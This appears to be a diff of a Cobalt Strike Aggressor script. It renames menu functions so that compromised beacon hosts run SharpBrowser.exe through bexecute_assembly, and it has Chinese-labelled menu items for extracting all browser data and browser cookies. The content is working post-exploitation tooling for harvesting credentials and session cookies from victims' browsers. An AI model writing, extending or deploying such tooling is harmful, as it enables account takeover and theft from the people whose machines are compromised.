@@ -13,14 +13,14 @@ popup beacon_bottom {
 		item "提取以下全部信息"{
 			local('$bid');
 				foreach $bid ($1){
-					sharpchromeall($bid);
+					sharpBrowserall($bid);
 				}
 			}
 
 		item "提取浏览器Cookies"{
 			local('$bid');
 				foreach $bid ($1){
-					sharpchromecookies($bid);
+					sharpBrowsercookies($bid);
 				}
 			}
 
@@ -43,11 +43,11 @@ popup beacon_bottom {
 					sharpskype($bid);
 				}
 			}
-	sub sharpchromeall{
+	sub sharpBrowserall{
 		bexecute_assembly($1, script_resource('/SharpBrowser.exe'), "all");
 		}
 
-	sub sharpchromecookies{
+	sub sharpBrowsercookies{
 		bexecute_assembly($1, script_resource('/SharpBrowser.exe'), "cookies");
 		}
 
